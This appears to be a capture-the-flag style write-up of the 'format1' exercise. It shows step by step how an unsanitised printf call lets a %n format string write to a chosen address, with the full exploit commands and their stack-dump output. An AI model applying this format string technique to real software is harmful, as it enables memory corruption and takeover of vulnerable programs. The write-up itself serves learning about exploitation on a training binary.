<h2>Goal</h2>

This exercise is the first real introduction into Format String exploits.  It will require sending a real format string character, such as `%s`, `%n`, `%d`, and `%x`. (There is a link in my Format0 writeup that explains more about Format Strings).


The vulnerability in this exercise is contained in the `printf()` statement.

```c
 printf(string);
  
  if(target) {
      printf("you have modified the target :)\n");
  }
```
`printf()` is another special ANSI C function, the `string` variable is user input specified and not sanitized. These functions have linux MAN page entries, which has a helpful BUGS section. My distro's MAN pages did not have the full MAN page with the BUGS section, but the full MAN page can be found online just by google searching for the "printf man page".  You can read the full BUGS section on your own to understand, but sending a `%n` will cause `printf()` to write to memory.


<h2>Process</h2>

This task hints that `objdump -t` will be our friend. Since the goal here is to change the `target` variable lets use `objdump -t` on format1 executable and look for the `target` variable.  Look at the man page for objdump to understand what the `-t` switch does.

I found `target` at: `0x08049638`


Now let's find where we can overwrite memory.

```bash
./format1 `python -c 'print "BBBBBBBBB"+"%x "*150'`
```
Theres a few things to note about this statement to help understand the process.  More than 4 B's are provided to account for padding issues. Say for example we provided 4 B's but only 3/4 bytes of our target location are B's. Also note that `"%x "*150` is sending 150 `"%x "` with a space.  This space will affect the padding, but makes the output easier to read for now (you will see what I mean when you try this).

This command generates the output:

```bash
./format1 `python -c 'print "BBBBBBBBB"+"%x "*150'`
BBBBBBBBB804960c bffff618 8048469 b7fd8304 b7fd7ff4 bffff618 8048435 bffff7de b7ff1040 804845b b7fd7ff4 8048450 0 bffff698 b7eadc76 2 bffff6c4 bffff6d0 b7fe1848 bffff680 ffffffff b7ffeff4 804824d 1 bffff680 b7ff0626 b7fffab0 b7fe1b28 b7fd7ff4 0 0 bffff698 c125e8ab eb71debb 0 0 0 2 8048340 0 b7ff6210 b7eadb9b b7ffeff4 2 8048340 0 8048361 804841c 2 bffff6c4 8048450 8048440 b7ff1040 bffff6bc b7fff8f8 2 bffff7d4 bffff7de 0 bffff9aa bffff9b8 bffff9cc bffff9f0 bffffa03 bffffa0d bffffefd bfffff3b bfffff4f bfffff66 bfffff77 bfffff7f bfffff8f bfffff9c bfffffd4 bfffffe6 0 20 b7fe2414 21 b7fe2000 10 fabfbff 6 1000 11 64 3 8048034 4 20 5 7 7 b7fe3000 8 0 9 8048340 b 3e9 c 0 d 3e9 e 3e9 17 1 19 bffff7bb 1f bffffff2 f bffff7cb 0 0 0 e000000 d43727e8 aaea1f64 84aeaf0 69d05f91 363836 0 6f662f2e 74616d72 42420031 42424242 25424242 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825```
```
What we are looking for in here is the is the last location where 4 B's, represented by ASCII `42424242`.  The 150 is an random value, if the B's do not occur, this value would need to be increased. In this 150 was sufficient, but `42424242` is not the last value, which means we need to narrow down to less. You can either count how many you need to remove or just trial and error to get the right amount. I removed 10, trying `"%x "*140`, then `"%x "*130` at which point I only needed to remove a few more chars.  

This command and the accompanying output shows the last values of all B's.
```bash
./format1 `python -c 'print "BBBBBBBBB"+"%x "*128'`
BBBBBBBB804960c bffff658 8048469 b7fd8304 b7fd7ff4 bffff658 8048435 bffff820 b7ff1040 804845b b7fd7ff4 8048450 0 bffff6d8 b7eadc76 2 bffff704 bffff710 b7fe1848 bffff6c0 ffffffff b7ffeff4 804824d 1 bffff6c0 b7ff0626 b7fffab0 b7fe1b28 b7fd7ff4 0 0 bffff6d8 c409ff39 ee5d4929 0 0 0 2 8048340 0 b7ff6210 b7eadb9b b7ffeff4 2 8048340 0 8048361 804841c 2 bffff704 8048450 8048440 b7ff1040 bffff6fc b7fff8f8 2 bffff816 bffff820 0 bffff9aa bffff9b8 bffff9cc bffff9f0 bffffa03 bffffa0d bffffefd bfffff3b bfffff4f bfffff66 bfffff77 bfffff7f bfffff8f bfffff9c bfffffd4 bfffffe6 0 20 b7fe2414 21 b7fe2000 10 fabfbff 6 1000 11 64 3 8048034 4 20 5 7 7 b7fe3000 8 0 9 8048340 b 3e9 c 0 d 3e9 e 3e9 17 1 19 bffff7fb 1f bffffff2 f bffff80b 0 0 0 ea000000 9fb61b27 8f231df2 4d82c3bb 69f6e340 363836 0 2f2e0000 6d726f66 317461 42424242
```

Now it is time to replace four B's with the address of target from before `0x08049638`. This will require a bit of trial and error but for me replacing the first 4 B's worked.
```bash
./format1 "`python -c 'print "\x38\x96\x04\x08BBBBB"+"%x "*128'`"
```

Output:

```
8�BBBBB804960c bffff658 8048469 b7fd8304 b7fd7ff4 bffff658 8048435 bffff820 b7ff1040 804845b b7fd7ff4 8048450 0 bffff6d8 b7eadc76 2 bffff704 bffff710 b7fe1848 bffff6c0 ffffffff b7ffeff4 804824d 1 bffff6c0 b7ff0626 b7fffab0 b7fe1b28 b7fd7ff4 0 0 bffff6d8 7765f619 5d314009 0 0 0 2 8048340 0 b7ff6210 b7eadb9b b7ffeff4 2 8048340 0 8048361 804841c 2 bffff704 8048450 8048440 b7ff1040 bffff6fc b7fff8f8 2 bffff816 bffff820 0 bffff9aa bffff9b8 bffff9cc bffff9f0 bffffa03 bffffa0d bffffefd bfffff3b bfffff4f bfffff66 bfffff77 bfffff7f bfffff8f bfffff9c bfffffd4 bfffffe6 0 20 b7fe2414 21 b7fe2000 10 fabfbff 6 1000 11 64 3 8048034 4 20 5 7 7 b7fe3000 8 0 9 8048340 b 3e9 c 0 d 3e9 e 3e9 17 1 19 bffff7fb 1f bffffff2 f bffff80b 0 0 0 a9000000 9b375abe 7b34444 48fd7a47 6928a4ca 363836 0 2f2e0000 6d726f66 317461 8049638
```
Looking at the end string we see the memory address we wanted is the last value. `0x8049638`

Now is to remove a `%x`, and add a `%n` as noted in the BUGS section of the MAN page for `printf()` which will write this value to memory.


<h2>Solution</h2>

```bash
./format1 "`python -c 'print "\x38\x96\x04\x08BBBBB"+"%x "*127+"%n "'`"
```

If you get padding errors and cannot seem to get the last four bytes to be the exact value, experiment with putting a couple of characters before and after, as well as removing some before and after the memory value.  Also remember the `"%x "`. THERE IS A SPACE. When replacing the final '%x' with `"%n "` remember to put in the space.

Output of solution code
```bash
./format1 "`python -c 'print "\x38\x96\x04\x08BBBBB"+"%x "*127+"%n "'`"
8�BBBBB804960c bffff658 8048469 b7fd8304 b7fd7ff4 bffff658 8048435 bffff820 b7ff1040 804845b b7fd7ff4 8048450 0 bffff6d8 b7eadc76 2 bffff704 bffff710 b7fe1848 bffff6c0 ffffffff b7ffeff4 804824d 1 bffff6c0 b7ff0626 b7fffab0 b7fe1b28 b7fd7ff4 0 0 bffff6d8 7cd9af5 2d992ce5 0 0 0 2 8048340 0 b7ff6210 b7eadb9b b7ffeff4 2 8048340 0 8048361 804841c 2 bffff704 8048450 8048440 b7ff1040 bffff6fc b7fff8f8 2 bffff816 bffff820 0 bffff9aa bffff9b8 bffff9cc bffff9f0 bffffa03 bffffa0d bffffefd bfffff3b bfffff4f bfffff66 bfffff77 bfffff7f bfffff8f bfffff9c bfffffd4 bfffffe6 0 20 b7fe2414 21 b7fe2000 10 fabfbff 6 1000 11 64 3 8048034 4 20 5 7 7 b7fe3000 8 0 9 8048340 b 3e9 c 0 d 3e9 e 3e9 17 1 19 bffff7fb 1f bffffff2 f bffff80b 0 0 0 3f000000 ad5d3300 d2c57c10 419c590b 69b087cf 363836 0 2f2e0000 6d726f66 317461  you have modified the target :)

```
